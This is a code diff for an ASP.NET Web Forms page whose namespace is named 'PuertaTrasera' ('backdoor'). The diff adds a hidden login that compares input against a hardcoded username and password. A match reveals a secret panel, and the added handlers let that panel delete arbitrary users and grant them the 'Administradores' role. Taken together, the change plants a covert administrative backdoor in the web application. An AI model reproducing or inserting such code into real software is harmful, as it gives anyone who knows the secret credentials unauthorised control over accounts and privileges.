@@ -17,6 +17,14 @@ namespace AplicacionWeb.PuertaTrasera
         protected void Page_Load(object sender, EventArgs e)
         {
 
+            if (!this.IsPostBack)
+            {
+
+                divContenidoSecreto.Visible = false;
+
+
+            }
+
             CargarUsuarios();
 
         }
@@ -24,9 +32,14 @@ namespace AplicacionWeb.PuertaTrasera
         protected void btnEliminar_Click(object sender, EventArgs e)
         {
 
-            string nombre = ddlUsuarios.Text;
+            if (gvUsuarios.SelectedIndex >= 0)
+            {
 
-            EliminarUsuario(nombre);
+                string nombre = gvUsuarios.Rows[gvUsuarios.SelectedIndex].Cells[1].Text;
+
+                EliminarUsuario(nombre);
+
+            }
 
         }
         
@@ -38,42 +51,57 @@ namespace AplicacionWeb.PuertaTrasera
             AgregarUsuarioAdministrador(nombre);
 
         }
+        
+        protected void btnCambiarAAdministrador_Click(object sender, EventArgs e)
+        {
+
+            if (gvUsuarios.SelectedIndex >= 0)
+            {
+
+                string nombre = gvUsuarios.Rows[gvUsuarios.SelectedIndex].Cells[1].Text;
+
+                AgregarUsuarioAdministrador(nombre);
+
+            }
+
+        }
+
+        protected void btnIniciarSesion_Click(object sender, EventArgs e)
+        {
+
+            string usuario = txtUsuario.Text;
+
+            string contraseña = txtContraseña.Text;
+
+            ValidarSesionCorrecta(usuario, contraseña);
+
+        }
 
         #endregion
 
         #region Metodos Privados
 
-        private void CargarUsuarioss()
-        {
-
-            var usuarios = Membership.GetAllUsers();
-
-            List<MembershipUser> lista = new List<MembershipUser>();
-                        
-            foreach (MembershipUser usuario in usuarios)
-            {
-                
-                lista.Add(usuario);
-
-            }
-
-            ddlUsuarios.DataSource = lista;
-
-            ddlUsuarios.DataBind();
-
-        }
-
         private void EliminarUsuario(string nombre)
         {
 
-            Membership.DeleteUser(nombre, true);
-            
+            if (!string.IsNullOrEmpty(nombre))
+            {
+
+                Membership.DeleteUser(nombre, true);
+
+            }
+
         }
 
         private void AgregarUsuarioAdministrador(string nombre)
         {
 
-            Roles.AddUserToRole(nombre, "Administradores");
+            if (!Roles.IsUserInRole(nombre, "Administradores"))
+            {
+
+                Roles.AddUserToRole(nombre, "Administradores");
+
+            }
 
         }
 
@@ -86,12 +114,26 @@ namespace AplicacionWeb.PuertaTrasera
 
         }
 
-        #endregion
-
-        protected void gvUsuarios_RowDeleting(object sender, GridViewDeleteEventArgs e)
+        private void ValidarSesionCorrecta(string usuario, string contraseña)
         {
 
-            //gvUsuarios.Rows(gvUsuarios.SelectedIndex).Columns("UserName");
+            if (usuario == "@ndrew" && contraseña == "@ndrewMonkey")
+            {
+
+                divIniciarSesionEstatico.Visible = false;
+
+                divContenidoSecreto.Visible = true;
+            
+            }
+
+        }
+        
+        #endregion
+
+        protected void CreateUserWizard_FinishButtonClick(object sender, WizardNavigationEventArgs e)
+        {
+
+            CargarUsuarios();
 
         }
         
